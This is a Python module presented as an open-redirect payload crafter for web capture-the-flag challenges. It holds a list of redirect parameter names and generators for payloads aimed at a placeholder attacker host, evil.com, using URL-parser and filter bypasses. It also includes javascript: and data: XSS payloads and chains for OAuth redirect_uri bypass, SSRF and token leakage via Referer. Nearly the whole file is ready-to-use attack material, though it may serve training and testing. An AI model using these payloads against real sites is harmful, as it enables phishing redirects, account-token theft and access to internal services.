"""
Open Redirect Payload Crafter for Web CTF.
Covers common redirect parameters, URL parser bypasses, and filter evasion techniques.
"""

from typing import List, Dict


def get_redirect_parameters() -> List[str]:
    """Common parameter names used for redirects."""
    return [
        "url", "redirect", "next", "return", "returnUrl", "return_url", "returnTo",
        "redirect_uri", "redirect_url", "redirectUrl", "dest", "destination", "target",
        "goto", "go", "out", "view", "login_url", "image_url", "continue", "window",
        "callback", "cb", "rurl", "u", "link", "src", "data", "path", "page", "ref",
        "referer", "referrer", "back", "forward", "to", "location", "site", "domain"
    ]


def get_open_redirect_payloads(target: str = "https://evil.com") -> List[Dict[str, str]]:
    """Generate open redirect payloads with various filter bypass techniques."""
    return [
        {
            "name": "Direct External URL",
            "payload": target,
            "desc": "Direct absolute URL redirect."
        },
        {
            "name": "Protocol-Relative URL",
            "payload": f"//{target.split('//')[1] if '//' in target else target}",
            "desc": "Protocol-relative URL (//evil.com) bypasses scheme checks."
        },
        {
            "name": "Backslash Protocol-Relative",
            "payload": f"\\\\{target.split('//')[1] if '//' in target else target}",
            "desc": "Backslash protocol-relative (\\\\evil.com) bypasses // filter."
        },
        {
            "name": "At-Sign Trick",
            "payload": f"https://trusted.com@{target.split('//')[1] if '//' in target else target}",
            "desc": "URL parser treats everything after @ as host (trusted.com@evil.com)."
        },
        {
            "name": "Hash Trick",
            "payload": f"https://{target.split('//')[1] if '//' in target else target}#@trusted.com",
            "desc": "Hash fragment confuses URL parsers (evil.com#@trusted.com)."
        },
        {
            "name": "Question Mark Trick",
            "payload": f"https://{target.split('//')[1] if '//' in target else target}?@trusted.com",
            "desc": "Query string confuses parsers (evil.com?@trusted.com)."
        },
        {
            "name": "Double Slash Prefix",
            "payload": f"//{target.split('//')[1] if '//' in target else target}",
            "desc": "Double slash prefix bypasses http(s):// checks."
        },
        {
            "name": "Triple Slash Prefix",
            "payload": f"///{target.split('//')[1] if '//' in target else target}",
            "desc": "Triple slash bypasses // filter."
        },
        {
            "name": "Encoded Slash",
            "payload": f"/%2f{target.split('//')[1] if '//' in target else target}",
            "desc": "URL-encoded slash bypasses path validation."
        },
        {
            "name": "Double Encoded Slash",
            "payload": f"/%252f{target.split('//')[1] if '//' in target else target}",
            "desc": "Double URL-encoded slash bypasses single decode filters."
        },
        {
            "name": "Javascript Scheme",
            "payload": "javascript:alert(1)",
            "desc": "Executes JavaScript if scheme is not validated."
        },
        {
            "name": "Data Scheme",
            "payload": "data:text/html,<script>alert(1)</script>",
            "desc": "Data URI scheme for XSS via redirect."
        },
        {
            "name": "Whitespace / Control Char Injection",
            "payload": f"https://trusted.com%0a{target.split('//')[1] if '//' in target else target}",
            "desc": "Newline injection to break host validation."
        },
        {
            "name": "Subdomain Prefix",
            "payload": f"https://{target.split('//')[1] if '//' in target else target}.trusted.com",
            "desc": "Attacker-controlled subdomain of trusted domain."
        },
        {
            "name": "Suffix Confusion",
            "payload": f"https://trusted.com.{target.split('//')[1] if '//' in target else target}",
            "desc": "Trusted domain as subdomain of attacker domain."
        },
        {
            "name": "Unicode Fullwidth Dot",
            "payload": f"https://trusted.com\u3002{target.split('//')[1] if '//' in target else target}",
            "desc": "Unicode fullwidth dot (U+3002) bypasses '.' filters."
        },
        {
            "name": "Null Byte",
            "payload": f"https://trusted.com%00{target.split('//')[1] if '//' in target else target}",
            "desc": "Null byte truncation (legacy PHP)."
        }
    ]


def get_open_redirect_chain_payloads(target: str = "https://evil.com") -> List[Dict[str, str]]:
    """Generate open redirect payloads useful for chaining with OAuth / SSRF."""
    return [
        {
            "name": "OAuth redirect_uri Bypass",
            "payload": f"https://trusted.com/oauth/callback?redirect={target}",
            "desc": "Chains open redirect to bypass OAuth redirect_uri validation."
        },
        {
            "name": "SSRF via Redirect",
            "payload": f"https://trusted.com/proxy?url={target}",
            "desc": "Uses open redirect to reach internal services via SSRF."
        },
        {
            "name": "Token Leak via Referer",
            "payload": f"https://trusted.com/login?next={target}",
            "desc": "Redirects after login, leaking tokens in Referer header."
        }
    ]
